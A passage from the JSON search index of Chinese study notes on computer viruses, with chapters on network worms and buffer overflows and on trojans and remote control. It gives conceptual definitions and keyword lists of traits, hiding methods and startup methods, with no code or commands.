\u7f13\u51b2\u533a\u6ea2\u51fa\u5c31\u662f\u4e0d\u987e\u5806\u6808\u4e2d\u5206\u914d\u7684\u5c40\u90e8\u6570\u636e\u5757\u5927\u5c0f\uff0c\u5411\u8be5\u6570\u636e\u5757\u5199\u5165\u4e86\u8f83\u591a\u7684\u6570\u636e\uff0c\u5bfc\u81f4\u6570\u636e\u8d8a\u754c\uff0c\u7ed3\u679c\u8986\u76d6\u4e86\u8001\u7684\u5806\u6808\u6570\u636e \uff081\uff09\u6570\u5b57\u8ba1\u7b97\u673a\u7684\u6570\u5236\u91c7\u7528\u4e8c\u8fdb\u5236\uff0c\u8ba1\u7b97\u673a\u5e94\u8be5\u6309\u7167\u7a0b\u5e8f\u987a\u5e8f\u6267\u884c\u3002 \uff082\uff09\u8ba1\u7b97\u673a\u7531\u63a7\u5236\u5668\u3001\u8fd0\u7b97\u5668\u3001\u5b58\u50a8\u5668\u3001\u8f93\u5165\u8bbe\u5907\u3001\u8f93\u51fa\u8bbe\u5907\u4e94\u5927\u90e8\u4ef6\u7ec4\u6210\u3002 \uff083\uff09\u7a0b\u5e8f\u548c\u6570\u636e\u4ee5\u4e8c\u8fdb\u5236\u4ee3\u7801\u5f62\u5f0f\u4e0d\u52a0\u533a\u522b\u5730\u5b58\u653e\u5728\u5b58\u50a8\u5668\u4e2d\uff0c\u5b58\u653e\u4f4d\u7f6e\u7531\u5730\u5740\u786e\u5b9a\u3002 \uff084\uff09\u63a7\u5236\u5668\u6839\u636e\u5b58\u653e\u5728\u5b58\u50a8\u5668\u4e2d\u7684\u6307\u4ee4\u5e8f\u5217\uff08\u7a0b\u5e8f\uff09\u8fdb\u884c\u5de5\u4f5c\uff0c\u5e76\u7531\u4e00\u4e2a\u7a0b\u5e8f\u8ba1\u6570\u5668\u63a7\u5236\u6307\u4ee4\u6267\u884c\u3002\u63a7\u5236\u5668\u5177\u6709\u5224\u65ad\u80fd\u529b\uff0c\u80fd\u6839\u636e\u8ba1\u7b97\u7ed3\u679c\u9009\u62e9\u4e0d\u540c\u7684\u5de5\u4f5c\u6d41\u7a0b\u3002\u56e0\u6b64\uff0c\u5728\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u4e0b\uff0c\u65e0\u8bba\u7a0b\u5e8f\u8ba1\u6570\u5668\u6307\u5411\u6570\u636e\u533a\u8fd8\u662f\u4ee3\u7801\u533a\uff0c\u90fd\u4f1a\u5c06\u6307\u5411\u7684\u5185\u5bb9\u5f53\u505a\u4ee3\u7801\u6267\u884c\u3002 \u7f13\u51b2\u533a\u6ea2\u51fa\u4ea7\u751f\u6761\u4ef6 # \u4f7f\u7528\u975e\u7c7b\u578b\u5b89\u5168\u7684\u8bed\u8a00\uff0c\u5982CIC++\uff08\u4e0d\u5224\u65ad\u8fb9\u754c\uff09\u3002 \u4ee5\u4e0d\u5b89\u5168\u7684\u65b9\u5f0f\u8bbf\u95ee\u6216\u590d\u5236\u7f13\u51b2\u533a\uff08\u4e0d\u8003\u8651\u5927\u5c0f\uff09\u3002 \u7f16\u8bd1\u5668\u5c06\u7f13\u51b2\u533a\u653e\u5728\u5185\u5b58\u4e2d\u5173\u952e\u6570\u636e\u7ed3\u6784\u65c1\u8fb9\u6216\u90bb\u8fd1\u7684\u4f4d\u7f6e\u3002\uff08\u4f8b\u5982\u5806\u6808\uff09 \u7f13\u51b2\u533a\u6ea2\u51fa\u4e3e\u4f8b # \u8815\u866b\u4e0e\u6ea2\u51fa # shellcode # Shellcode\u662f\u6307\u80fd\u5b8c\u6210\u7279\u6b8a\u4efb\u52a1\u7684\u81ea\u5305\u542b\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\uff0c\u6839\u636e\u4e0d\u540c\u7684\u4efb\u52a1\u53ef\u80fd\u662f\u53d1\u51fa\u4e00\u6761\u7cfb\u7edf\u8c03\u7528\u6216\u5efa\u7acb\u4e00\u4e2a\u9ad8\u6743\u9650\u7684Shell\uff0cShellcode\u56e0\u6b64\u5f97\u540d\u3002 \u6700\u7ec8\u76ee\u7684\uff1a\u83b7\u53d6\u76ee\u6807\u673a\u5668\u7684\u63a7\u5236\u6743\u3002 shellcode\u7279\u70b9 # Shellcode\u4e00\u822c\u662f\u4f5c\u4e3a\u6570\u636e\u5f62\u5f0f\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u5236\u9020\u6ea2\u51fa\u5f97\u4ee5\u6267\u884c\u4ee3\u7801\u5e76\u83b7\u53d6\u63a7\u5236\u6743\u7684 \uff081\uff09\u957f\u5ea6\u53d7\u9650 \uff082\uff09\u4e0d\u80fd\u4f7f\u7528\u7279\u6b8a\u5b57\u7b26\uff0c\u4f8b\u5982\\00\u3001xff\u7b49 \uff083\uff09\u5177\u6709\u91cd\u5b9a\u4f4d\u80fd\u529b \uff084\uff09\u4e00\u5b9a\u7684\u517c\u5bb9\u6027 \u7f13\u5b58\u533a\u6ea2\u51fa\u6f0f\u6d1e\u907f\u514d\u65b9\u6cd5 # \u68c0\u67e5\u5bb9\u6613\u51fa\u9519\u7684\u51fd\u6570 \u6570\u7ec4\u8fb9\u754c\u68c0\u67e5\uff0c\u8981\u6c42\u4ee3\u7801\u4f20\u9012\u7f13\u51b2\u533a\u7684\u957f\u5ea6 \u7a0b\u5e8f\u6307\u9488\u5b8c\u6574\u6027\u68c0\u67e5","title":"\u7f51\u7edc\u8815\u866b\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u7f51\u7edc\u8815\u866b\u75c5\u6bd2","text":"","title":"\u7f51\u7edc\u8815\u866b\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u8815\u866b\u75c5\u6bd2\u7684\u57fa\u672c\u7279\u5f81","text":"\u53ef\u4ee5\u4ece\u4e00\u53f0\u8ba1\u7b97\u673a\u79fb\u52a8\u5230\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a \u53ef\u4ee5\u81ea\u6211\u590d\u5236","title":"\u8815\u866b\u75c5\u6bd2\u7684\u57fa\u672c\u7279\u5f81"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u8815\u866b\u7684\u7279\u6027","text":"\u4f20\u64ad\u6027 \u5bc4\u751f\u6027 \u4e0d\u5bc4\u751f\u4e8e\u6587\u4ef6\u6216\u5f15\u5bfc\u6247\u533a\uff0c\u4e00\u822c\u4ee5\u72ec\u7acb\u7684\u6587\u4ef6\u6216\u8005\u591a\u4e2a\u6587\u4ef6\u5b58\u5728\u4e8e\u78c1\u76d8\uff0c\u4ee5\u72ec\u7acb\u7684\u8fdb\u7a0b\u8fd0\u884c\u4e8e\u5185\u5b58\u6216\u8005\u5bc4\u751f\u5728\u5176\u4ed6\u8fdb\u7a0b\u4e2d","title":"\u8815\u866b\u7684\u7279\u6027"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u8815\u866b\u653b\u51fb\u5bf9\u8c61","text":"\u9488\u5bf9\u4f01\u4e1a\u7528\u6237\u548c\u5c40\u57df\u7f51\uff08\u7cfb\u7edf\u6f0f\u6d1e\u4e3b\u52a8\u653b\u51fb\uff09 \u4e2a\u4eba\u7528\u6237\uff08email\uff09","title":"\u8815\u866b\u653b\u51fb\u5bf9\u8c61"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u8815\u866b\u7684\u7279\u70b9","text":"\u5229\u7528\u64cd\u4f5c\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u4e3b\u52a8\u8fdb\u884c\u653b\u51fb \u4f20\u64ad\u65b9\u5f0f\u591a\u6837\u5316 \u75c5\u6bd2\u5236\u4f5c\u6280\u672f\u4e0e\u9ed1\u5ba2\u6280\u672f\u76f8\u7ed3\u5408\uff0c\u6f5c\u5728\u7684\u5a01\u80c1\u548c\u635f\u5931\u66f4\u5927","title":"\u8815\u866b\u7684\u7279\u70b9"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u8815\u866b\u7684\u653b\u51fb\u624b\u6bb5","text":"\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb-\u5806\u6808\u3001\u5806 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb \u62d2\u7edd\u670d\u52a1\u653b\u51fb \u5f31\u53e3\u4ee4\u653b\u51fb \u9ed8\u8ba4\u8bbe\u7f6e\u8106\u5f31\u6027\u653b\u51fb","title":"\u8815\u866b\u7684\u653b\u51fb\u624b\u6bb5"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u8815\u866b\u548c\u75c5\u6bd2\u7684\u533a\u522b","text":"\u8ba1\u7b97\u673a\u75c5\u6bd2\u4e0e\u8815\u866b\u7684\u4e00\u4e2a\u91cd\u8981\u533a\u522b\u662f\uff0c\u75c5\u6bd2\u9700\u8981\u501f\u52a9\u6d3b\u52a8\u7684\u5bbf\u4e3b\u7a0b\u5e8f\u6216\u5df2\u88ab\u611f\u67d3\u7684\u6d3b\u52a8\u64cd\u4f5c\u7cfb\u7edf\u624d\u80fd\u8fd0\u884c\u3001\u9020\u6210\u7834\u574f\u5e76\u611f\u67d3\u5176\u4ed6\u53ef\u6267\u884c\u6587\u4ef6\u6216\u6587\u6863\uff1b\u800c\u8815\u866b\u662f\u72ec\u7acb\u7684\u6076\u610f\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97\u673a\u7f51\u7edc\u8fdb\u884c\u81ea\u6211\u590d\u5236\u548c\u4f20\u64ad\uff0c\u4e0d\u9700\u8981\u4eba\u5de5\u5e72\u9884\u3002","title":"\u8815\u866b\u548c\u75c5\u6bd2\u7684\u533a\u522b"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u7f13\u51b2\u533a\u6ea2\u51fa","text":"\u6240\u8c13\u7f13\u51b2\u533a\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u7a0b\u5e8f\u8fd0\u884c\u65f6\u5185\u5b58\u4e2d\u7684\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u3002 \u4f8b\u5982C\u8bed\u8a00\u4e2d\u7ecf\u5e38\u8981\u7528\u5230\u7684\u6570\u7ec4\uff0c\u5176\u4e2d\u6700\u5e38\u89c1\u7684\u662f\u5b57\u7b26\u6570\u7ec4\u3002 \u5982\u679c\u5411\u4e00\u4e2a\u7f13\u51b2\u533a\u590d\u5236\u6570\u636e\uff0c\u4f46\u662f\u590d\u5236\u7684\u6570\u636e\u91cf\u6bd4\u7f13\u51b2\u533a\u5927\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u53d1\u751f\u7f13\u51b2\u533a\u6ea2\u51fa\u3002","title":"\u7f13\u51b2\u533a\u6ea2\u51fa"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u4ea7\u751f\u7684\u6839\u6e90","text":"\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u5bf9\u4ee3\u7801\u548c\u6570\u636e\u91c7\u7528\u7edf\u4e00\u7f16\u5740\uff0c\u6ca1\u6709\u4e25\u683c\u533a\u5206\u4e8c\u8005\u3002\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u89c4\u5b9a\uff1a \u7f13\u51b2\u533a\u6ea2\u51fa\u5c31\u662f\u4e0d\u987e\u5806\u6808\u4e2d\u5206\u914d\u7684\u5c40\u90e8\u6570\u636e\u5757\u5927\u5c0f\uff0c\u5411\u8be5\u6570\u636e\u5757\u5199\u5165\u4e86\u8f83\u591a\u7684\u6570\u636e\uff0c\u5bfc\u81f4\u6570\u636e\u8d8a\u754c\uff0c\u7ed3\u679c\u8986\u76d6\u4e86\u8001\u7684\u5806\u6808\u6570\u636e \uff081\uff09\u6570\u5b57\u8ba1\u7b97\u673a\u7684\u6570\u5236\u91c7\u7528\u4e8c\u8fdb\u5236\uff0c\u8ba1\u7b97\u673a\u5e94\u8be5\u6309\u7167\u7a0b\u5e8f\u987a\u5e8f\u6267\u884c\u3002 \uff082\uff09\u8ba1\u7b97\u673a\u7531\u63a7\u5236\u5668\u3001\u8fd0\u7b97\u5668\u3001\u5b58\u50a8\u5668\u3001\u8f93\u5165\u8bbe\u5907\u3001\u8f93\u51fa\u8bbe\u5907\u4e94\u5927\u90e8\u4ef6\u7ec4\u6210\u3002 \uff083\uff09\u7a0b\u5e8f\u548c\u6570\u636e\u4ee5\u4e8c\u8fdb\u5236\u4ee3\u7801\u5f62\u5f0f\u4e0d\u52a0\u533a\u522b\u5730\u5b58\u653e\u5728\u5b58\u50a8\u5668\u4e2d\uff0c\u5b58\u653e\u4f4d\u7f6e\u7531\u5730\u5740\u786e\u5b9a\u3002 \uff084\uff09\u63a7\u5236\u5668\u6839\u636e\u5b58\u653e\u5728\u5b58\u50a8\u5668\u4e2d\u7684\u6307\u4ee4\u5e8f\u5217\uff08\u7a0b\u5e8f\uff09\u8fdb\u884c\u5de5\u4f5c\uff0c\u5e76\u7531\u4e00\u4e2a\u7a0b\u5e8f\u8ba1\u6570\u5668\u63a7\u5236\u6307\u4ee4\u6267\u884c\u3002\u63a7\u5236\u5668\u5177\u6709\u5224\u65ad\u80fd\u529b\uff0c\u80fd\u6839\u636e\u8ba1\u7b97\u7ed3\u679c\u9009\u62e9\u4e0d\u540c\u7684\u5de5\u4f5c\u6d41\u7a0b\u3002\u56e0\u6b64\uff0c\u5728\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u4e0b\uff0c\u65e0\u8bba\u7a0b\u5e8f\u8ba1\u6570\u5668\u6307\u5411\u6570\u636e\u533a\u8fd8\u662f\u4ee3\u7801\u533a\uff0c\u90fd\u4f1a\u5c06\u6307\u5411\u7684\u5185\u5bb9\u5f53\u505a\u4ee3\u7801\u6267\u884c\u3002","title":"\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u4ea7\u751f\u7684\u6839\u6e90"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u7f13\u51b2\u533a\u6ea2\u51fa\u4ea7\u751f\u6761\u4ef6","text":"\u4f7f\u7528\u975e\u7c7b\u578b\u5b89\u5168\u7684\u8bed\u8a00\uff0c\u5982CIC++\uff08\u4e0d\u5224\u65ad\u8fb9\u754c\uff09\u3002 \u4ee5\u4e0d\u5b89\u5168\u7684\u65b9\u5f0f\u8bbf\u95ee\u6216\u590d\u5236\u7f13\u51b2\u533a\uff08\u4e0d\u8003\u8651\u5927\u5c0f\uff09\u3002 \u7f16\u8bd1\u5668\u5c06\u7f13\u51b2\u533a\u653e\u5728\u5185\u5b58\u4e2d\u5173\u952e\u6570\u636e\u7ed3\u6784\u65c1\u8fb9\u6216\u90bb\u8fd1\u7684\u4f4d\u7f6e\u3002\uff08\u4f8b\u5982\u5806\u6808\uff09","title":"\u7f13\u51b2\u533a\u6ea2\u51fa\u4ea7\u751f\u6761\u4ef6"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u7f13\u51b2\u533a\u6ea2\u51fa\u4e3e\u4f8b","text":"","title":"\u7f13\u51b2\u533a\u6ea2\u51fa\u4e3e\u4f8b"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u8815\u866b\u4e0e\u6ea2\u51fa","text":"","title":"\u8815\u866b\u4e0e\u6ea2\u51fa"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#shellcode","text":"Shellcode\u662f\u6307\u80fd\u5b8c\u6210\u7279\u6b8a\u4efb\u52a1\u7684\u81ea\u5305\u542b\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\uff0c\u6839\u636e\u4e0d\u540c\u7684\u4efb\u52a1\u53ef\u80fd\u662f\u53d1\u51fa\u4e00\u6761\u7cfb\u7edf\u8c03\u7528\u6216\u5efa\u7acb\u4e00\u4e2a\u9ad8\u6743\u9650\u7684Shell\uff0cShellcode\u56e0\u6b64\u5f97\u540d\u3002 \u6700\u7ec8\u76ee\u7684\uff1a\u83b7\u53d6\u76ee\u6807\u673a\u5668\u7684\u63a7\u5236\u6743\u3002","title":"shellcode"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#shellcode\u7279\u70b9","text":"Shellcode\u4e00\u822c\u662f\u4f5c\u4e3a\u6570\u636e\u5f62\u5f0f\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u5236\u9020\u6ea2\u51fa\u5f97\u4ee5\u6267\u884c\u4ee3\u7801\u5e76\u83b7\u53d6\u63a7\u5236\u6743\u7684 \uff081\uff09\u957f\u5ea6\u53d7\u9650 \uff082\uff09\u4e0d\u80fd\u4f7f\u7528\u7279\u6b8a\u5b57\u7b26\uff0c\u4f8b\u5982\\00\u3001xff\u7b49 \uff083\uff09\u5177\u6709\u91cd\u5b9a\u4f4d\u80fd\u529b \uff084\uff09\u4e00\u5b9a\u7684\u517c\u5bb9\u6027","title":"shellcode\u7279\u70b9"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC5%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/#\u7f13\u5b58\u533a\u6ea2\u51fa\u6f0f\u6d1e\u907f\u514d\u65b9\u6cd5","text":"\u68c0\u67e5\u5bb9\u6613\u51fa\u9519\u7684\u51fd\u6570 \u6570\u7ec4\u8fb9\u754c\u68c0\u67e5\uff0c\u8981\u6c42\u4ee3\u7801\u4f20\u9012\u7f13\u51b2\u533a\u7684\u957f\u5ea6 \u7a0b\u5e8f\u6307\u9488\u5b8c\u6574\u6027\u68c0\u67e5","title":"\u7f13\u5b58\u533a\u6ea2\u51fa\u6f0f\u6d1e\u907f\u514d\u65b9\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC6%E7%AB%A0%20%E6%9C%A8%E9%A9%AC%E4%B8%8E%E8%BF%9C%E6%8E%A7/","text":"\u6728\u9a6c\u4e0e\u8fdc\u63a7 # \u6728\u9a6c\u4e0e\u75c5\u6bd2\u7684\u533a\u522b # \u533a\u522b\uff1a\u6728\u9a6c\u4e00\u822c\u4e0d\u8fdb\u884c\u611f\u67d3\u548c\u4f20\u64ad\u81ea\u8eab\uff0c\u4f46\u4e5f\u53ef\u80fd\u5177\u6709\u5bc4\u751f\u6027\uff0c\u6bd4\u5982\u4e00\u4e9b\u6346\u7ed1\u5728\u5408\u6cd5\u7a0b\u5e8f\u4e2d\u5f97\u5230\u5b89\u88c5\u3001\u542f\u52a8\u6728\u9a6c\u7684\u6743\u9650\uff08\u6587\u4ef6\u6346\u7ed1\u5668\u3001dll\u52ab\u6301\uff09\u3002 \u6211\u4eec\u4e60\u60ef\u4e0a\u5c06\u5176\u7eb3\u5165\u5e7f\u4e49\u75c5\u6bd2\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6728\u9a6c\u4e5f\u662f\u5e7f\u4e49\u75c5\u6bd2\u7684\u4e00\u4e2a\u5b50\u7c7b\u3002 \u6728\u9a6c\u7684\u6982\u5ff5 # \u6728\u9a6c\u901a\u5e38\u662f\u7528\u4e8e\u7a83\u53d6\u4fe1\u606f\uff0c\u5b9e\u65bd\u8fdc\u7a0b\u63a7\u5236\u7684\u4e00\u6bb5\u7279\u6b8a\u6076\u610f\u4ee3\u7801 \u6728\u9a6c\u7684\u7ed3\u6784 # \u6728\u9a6c\u5e38\u7528\u4f20\u64ad\u65b9\u5f0f # \u90ae\u4ef6\u9644\u4ef6 \u804a\u5929\u5de5\u5177\u8f6f\u4ef6 \u5171\u4eab\u8f6f\u4ef6\u7f51\u7ad9 \u75c5\u6bd2/\u8815\u866b \u78c1\u76d8\u548c\u5149\u76d8 \u6728\u9a6c\u7684\u7279\u6027 # \u6b3a\u9a97\u6027 \u9690\u853d\u6027 \u81ea\u52a8\u8fd0\u884c\u6027 \u81ea\u6211\u4fdd\u62a4\u6027 \u529f\u80fd\u7279\u6b8a\u6027 \u6728\u9a6c\u9690\u85cf\u65b9\u5f0f # \u4fee\u6539\u56fe\u6807 \u4f2a\u9020\u540d\u79f0 \u6346\u7ed1\u6587\u4ef6 \u51fa\u9519\u63d0\u793a\uff08\u9493\u9c7c\uff09 \u81ea\u6211\u9500\u6bc1 \u6728\u9a6c\u7684\u79d8\u5bc6\u4fe1\u9053\u6280\u672f # TCP UDP ICMP HTTP \u7aef\u53e3\u590d\u7528 \u62a5\u6587\u4f2a\u88c5 \u6728\u9a6c\u542f\u52a8\u65b9\u5f0f # \u6346\u7ed1\u5e94\u7528\u7a0b\u5e8f\uff0cdll\u52ab\u6301 \u4fee\u6539\u7cfb\u7edf\u6ce8\u518c\u8868\u7684\u5404\u79cd\u542f\u52a8\u9879\uff08\u5e38\u7528\uff09 \u6ce8\u518c\u4e3a\u4e00\u4e2a\u7cfb\u7edf\u670d\u52a1 \u5e94\u7528\u7a0b\u5e8f\u542f\u52a8\u7ec4 \u4fee\u6539\u6587\u4ef6\u5173\u8054 \u6728\u9a6c\u5206\u7c7b # \u5bc6\u7801\u76d7\u7a83\u578b \u65e5\u5fd7\u578b \u8fdc\u63a7\u578b \u6bc1\u706d\u578b FTP\u578b","title":"\u6728\u9a6c\u4e0e\u8fdc\u63a7"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC6%E7%AB%A0%20%E6%9C%A8%E9%A9%AC%E4%B8%8E%E8%BF%9C%E6%8E%A7/#\u6728\u9a6c\u4e0e\u8fdc\u63a7","text":"","title":"\u6728\u9a6c\u4e0e\u8fdc\u63a7"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC6%E7%AB%A0%20%E6%9C%A8%E9%A9%AC%E4%B8%8E%E8%BF%9C%E6%8E%A7/#\u6728\u9a6c\u4e0e\u75c5\u6bd2\u7684\u533a\u522b","text":"\u533a\u522b\uff1a\u6728\u9a6c\u4e00\u822c\u4e0d\u8fdb\u884c\u611f\u67d3\u548c\u4f20\u64ad\u81ea\u8eab\uff0c\u4f46\u4e5f\u53ef\u80fd\u5177\u6709\u5bc4\u751f\u6027\uff0c\u6bd4\u5982\u4e00\u4e9b\u6346\u7ed1\u5728\u5408\u6cd5\u7a0b\u5e8f\u4e2d\u5f97\u5230\u5b89\u88c5\u3001\u542f\u52a8\u6728\u9a6c\u7684\u6743\u9650\uff08\u6587\u4ef6\u6346\u7ed1\u5668\u3001dll\u52ab\u6301\uff09\u3002 \u6211\u4eec\u4e60\u60ef\u4e0a\u5c06\u5176\u7eb3\u5165\u5e7f\u4e49\u75c5\u6bd2\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6728\u9a6c\u4e5f\u662f\u5e7f\u4e49\u75c5\u6bd2\u7684\u4e00\u4e2a\u5b50\u7c7b\u3002","title":"\u6728\u9a6c\u4e0e\u75c5\u6bd2\u7684\u533a\u522b"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC6%E7%AB%A0%20%E6%9C%A8%E9%A9%AC%E4%B8%8E%E8%BF%9C%E6%8E%A7/#\u6728\u9a6c\u7684\u6982\u5ff5","text":"\u6728\u9a6c\u901a\u5e38\u662f\u7528\u4e8e\u7a83\u53d6\u4fe1\u606f\uff0c\u5b9e\u65bd\u8fdc\u7a0b\u63a7\u5236\u7684\u4e00\u6bb5\u7279\u6b8a\u6076\u610f\u4ee3\u7801","title":"\u6728\u9a6c\u7684\u6982\u5ff5"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC6%E7%AB%A0%20%E6%9C%A8%E9%A9%AC%E4%B8%8E%E8%BF%9C%E6%8E%A7/#\u6728\u9a6c\u7684\u7ed3\u6784","text":"","title":"\u6728\u9a6c\u7684\u7ed3\u6784"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC6%E7%AB%A0%20%E6%9C%A8%E9%A9%AC%E4%B8%8E%E8%BF%9C%E6%8E%A7/#\u6728\u9a6c\u5e38\u7528\u4f20\u64ad\u65b9\u5f0f","text":"\u90ae\u4ef6\u9644\u4ef6 \u804a\u5929\u5de5\u5177\u8f6f\u4ef6 \u5171\u4eab\u8f6f\u4ef6\u7f51\u7ad9 \u75c5\u6bd2/\u8815\u866b \u78c1\u76d8\u548c\u5149\u76d8","title":"\u6728\u9a6c\u5e38\u7528\u4f20\u64ad\u65b9\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC6%E7%AB%A0%20%E6%9C%A8%E9%A9%AC%E4%B8%8E%E8%BF%9C%E6%8E%A7/#\u6728\u9a6c\u7684\u7279\u6027","text":"\u6b3a\u9a97\u6027 \u9690\u853d\u6027 \u81ea\u52a8\u8fd0\u884c\u6027 \u81ea\u6211\u4fdd\u62a4\u6027 \u529f\u80fd\u7279\u6b8a\u6027","title":"\u6728\u9a6c\u7684\u7279\u6027"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC6%E7%AB%A0%20%E6%9C%A8%E9%A9%AC%E4%B8%8E%E8%BF%9C%E6%8E%A7/#\u6728\u9a6c\u9690\u85cf\u65b9\u5f0f","text":"\u4fee\u6539\u56fe\u6807 \u4f2a\u9020\u540d\u79f0 \u6346\u7ed1\u6587\u4ef6 \u51fa\u9519\u63d0\u793a\uff08\u9493\u9c7c\uff09 \u81ea\u6211\u9500\u6bc1","title":"\u6728\u9a6c\u9690\u85cf\u65b9\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC6%E7%AB%A0%20%E6%9C%A8%E9%A9%AC%E4%B8%8E%E8%BF%9C%E6%8E%A7/#\u6728\u9a6c\u7684\u79d8\u5bc6\u4fe1\u9053\u6280\u672f","text":"TCP UDP ICMP HTTP \u7aef\u53e3\u590d\u7528 \u62a5\u6587\u4f2a\u88c5","title":"\u6728\u9a6c\u7684\u79d8\u5bc6\u4fe1\u9053\u6280\u672f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC6%E7%AB%A0%20%E6%9C%A8%E9%A9%AC%E4%B8%8E%E8%BF%9C%E6%8E%A7/#\u6728\u9a6c\u542f\u52a8\u65b9\u5f0f","text":"\u6346\u7ed1\u5e94\u7528\u7a0b\u5e8f\uff0cdll\u52ab\u6301 \u4fee\u6539\u7cfb\u7edf\u6ce8\u518c\u8868\u7684\u5404\u79cd\u542f\u52a8\u9879\uff08\u5e38\u7528\uff09 \u6ce8\u518c\u4e3a\u4e00\u4e2a\u7cfb\u7edf\u670d\u52a1 \u5e94\u7528\u7a0b\u5e8f\u542f\u52a8\u7ec4 \u4fee\u6539\u6587\u4ef6\u5173\u8054","title":"\u6728\u9a6c\u542f\u52a8\u65b9\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC6%E7%AB%A0%20%E6%9C%A8%E9%A9%AC%E4%B8%8E%E8%BF%9C%E6%8E%A7/#\u6728\u9a6c\u5206\u7c7b","text":"\u5bc6\u7801\u76d7\u7a83\u578b \u65e5\u5fd7\u578b \u8fdc\u63a7\u578b \u6bc1\u706d\u578b 